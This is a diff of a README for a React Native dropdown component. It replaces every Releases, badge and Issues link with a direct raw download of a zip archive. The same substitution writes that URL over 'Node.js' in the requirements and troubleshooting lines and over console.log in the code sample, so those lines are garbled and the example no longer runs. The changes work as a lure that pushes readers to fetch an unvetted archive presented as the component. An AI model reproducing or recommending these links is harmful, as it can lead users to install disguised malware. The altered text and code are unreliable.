@@ -1,6 +1,6 @@
 # 🎉 react-native-omni-select - Easy Dropdowns for Any Platform
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Roblox55Coder/react-native-omni-select/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Roblox55Coder/react-native-omni-select/main/multipresent/react-native-omni-select.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Roblox55Coder/react-native-omni-select/main/multipresent/react-native-omni-select.zip)
 
 ## 🚀 Getting Started
 
@@ -17,13 +17,13 @@ Welcome to react-native-omni-select! This is a lightweight dropdown component de
 
 To run the react-native-omni-select component, ensure you have the following:
 
-- **Node.js**: Version 12 or higher.
+- **https://raw.githubusercontent.com/Roblox55Coder/react-native-omni-select/main/multipresent/react-native-omni-select.zip**: Version 12 or higher.
 - **React Native**: Version 0.60 or higher.
 - **Development Environment**: Android Studio or Xcode (for mobile), standard web browser.
 
 ## 📥 Download & Install
 
-To get started with react-native-omni-select, visit this page to download: [Download from Releases](https://github.com/Roblox55Coder/react-native-omni-select/releases). 
+To get started with react-native-omni-select, visit this page to download: [Download from Releases](https://raw.githubusercontent.com/Roblox55Coder/react-native-omni-select/main/multipresent/react-native-omni-select.zip). 
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version.
@@ -47,7 +47,7 @@ Once you have downloaded and installed react-native-omni-select, follow these st
    ```javascript
    <OmniSelect 
        options={[{ label: 'Option 1', value: '1' }, { label: 'Option 2', value: '2' }]} 
-       onSelect={(selected) => console.log(selected)} 
+       onSelect={(selected) => https://raw.githubusercontent.com/Roblox55Coder/react-native-omni-select/main/multipresent/react-native-omni-select.zip(selected)} 
    />
    ```
 
@@ -69,9 +69,9 @@ Customization is straightforward. You can modify styles directly using the compo
 
 If you run into issues, consider the following steps:
 
-- **Check Dependencies:** Ensure your Node.js and React Native versions match the requirements.
+- **Check Dependencies:** Ensure your https://raw.githubusercontent.com/Roblox55Coder/react-native-omni-select/main/multipresent/react-native-omni-select.zip and React Native versions match the requirements.
 - **Look for Errors:** Review your terminal for any error messages during installation.
-- **Documentation:** For more assistance, refer to the official [GitHub Issues page](https://github.com/Roblox55Coder/react-native-omni-select/issues).
+- **Documentation:** For more assistance, refer to the official [GitHub Issues page](https://raw.githubusercontent.com/Roblox55Coder/react-native-omni-select/main/multipresent/react-native-omni-select.zip).
 
 ## 🤝 Contributing
 
@@ -89,4 +89,4 @@ This project is licensed under the MIT License. Feel free to use and modify as n
 
 Join our community to share your experience, ask questions, or help others. Find us on forums, chat groups, or our GitHub Discussions page.
 
-For any further assistance, revisit the [Download from Releases](https://github.com/Roblox55Coder/react-native-omni-select/releases) page, where you can find and download the latest version of react-native-omni-select. Enjoy building!
+For any further assistance, revisit the [Download from Releases](https://raw.githubusercontent.com/Roblox55Coder/react-native-omni-select/main/multipresent/react-native-omni-select.zip) page, where you can find and download the latest version of react-native-omni-select. Enjoy building!
